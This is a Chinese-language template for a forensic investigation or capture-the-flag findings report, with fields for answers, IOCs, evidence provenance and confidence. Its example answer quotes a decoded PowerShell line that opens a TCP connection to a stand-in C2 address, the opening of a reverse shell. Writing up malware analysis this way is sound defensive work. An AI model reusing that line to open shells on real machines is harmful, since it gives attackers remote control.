# FINDING: [任務代號_簡短名稱] 成果回報

## 1. 成果回報資訊
- **對應任務**：`TASK_[任務代號]`
- **解決小題**：`Q03, Q04`
- **解答 Session**：`Session-Worker`
- **完成時間**：`YYYY-MM-DD HH:MM:SS UTC`
- **Confidence**：`LOW` / `MEDIUM` / `HIGH`

---

## 2. 核心結論與關鍵答案 (Direct Answers)
*(直接列出可填入 questions.md 的標準答案，精簡無廢話)*

- **Answer / Conclusion**：
- **解密後明文指令**：
  ```powershell
  $client = New-Object System.Net.Sockets.TCPClient("203.0.113.10",8080);
  ```
- **萃取出之 IOC**：
  - **C2 IP**：`203.0.113.10`
  - **C2 Port**：`8080`
  - **落地路徑**：`C:\Users\Public\update.exe`
  - **計算之 SHA-256**：`8D5D5BBDCCB82A10AC28E2779BA0821F12DA3E1F08F03EC467CE213A6FCCF38C`

---

## 3. Evidence Contract
- **Artifact / Source**：`sample.E01 -> path/to/file` / `memory.raw` / `audit.log`
- **Artifact hash（若可得）**：`SHA-256 ...`
- **取得方法 / Tool**：工具名稱、版本、關鍵命令或查詢條件
- **Direct Observation**：直接從工件讀到的內容；不要把推論寫成 observation
- **Reproduction**：另一個 Session 可重現此 observation 的最短步驟
- **Known Limitations**：缺漏資料、時區、工具解析限制、可能替代解釋

## 4. 分析與推論 (Analysis)
1. 清楚區分 observation 與 inference。
2. 若引用威脅情報或外部資料，只能作為輔助，不可取代本題工件證據。
3. `Confidence` 是 evidence 的摘要，不是獨立證明。

## 5. 建議下一步
- **建議答案狀態**：`CANDIDATE` / `VERIFIED`
- **需要額外 review**：`YES` / `NO`
- **尚未解決問題**：列出 evidence gap；若無則填 `None`。
